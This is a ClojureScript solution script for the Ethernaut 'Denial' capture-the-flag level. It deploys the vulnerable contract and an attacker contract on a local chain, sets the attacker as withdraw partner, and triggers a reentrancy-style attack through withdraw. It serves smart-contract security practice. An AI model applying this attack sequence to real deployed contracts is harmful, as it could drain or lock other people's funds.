(ns main.ctf.ethernaut.denial
  "The Denial contract vulnerability exposes it Rentrancy attack!"
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-denial!
  "Deploys the Denial contract using Owner's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :denial
                  w/local-wallet)]
    (.deploy contract)))


(defn deploy-attacker!
  "Deploys the Attacker contract using player's wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract
                  :denial/attack
                  player)]
    (.deploy contract)))


(defn reentrancy-attack
  []
  (try-async
   [denial   (<p! (deploy-denial!))
    attacker (<p! (deploy-attacker!))
    txn      (clj->js
              {:value (u/eth-str->wei "0.01")
               :to    (.-address denial)})]
   (do
     ;; 1. Fund the Denial contract with lcoal wallet
     (<p! (.sendTransaction ^js w/local-wallet txn))

     ;; 2. Set the partner (malicious contract)
     (<p! (.setWithdrawPartner (.connect denial player)
                               (.-address attacker)))

     ;; 3. trigger attack
     (<p! (.withdraw (.connect denial player)
                     (js-obj "gasLimit" 1000000))))))


(comment

  (a/take! (reentrancy-attack) #(.log js/console))

  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def denial (atom ""))
  (-> (deploy-denial!)
      (.then #(reset! denial %))
      (.catch #(.log js/console %)))

  ;; send initail funds to denial contract
  (->
   (.sendTransaction ^js w/local-wallet
                     (clj->js
                      {:value (u/eth-str->wei "0.01")
                       :to    (.-address @denial)}))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; get balance
  (-> (.getBalance w/local-provider (.-address @denial))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def attacker (atom ""))
  (-> (deploy-attacker!)
      (.then #(reset! attacker %))
      (.catch #(.log js/console %)))

  ;; set attacker as the partner
  (-> (.setWithdrawPartner @denial
                           (.-address @attacker))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  (-> (.partner @denial)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  ;; trigger the attack by calling withdraw from palyer's account
  (-> (.withdraw (.connect @denial player)
                 (js-obj "gasLimit" 1000000))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  )
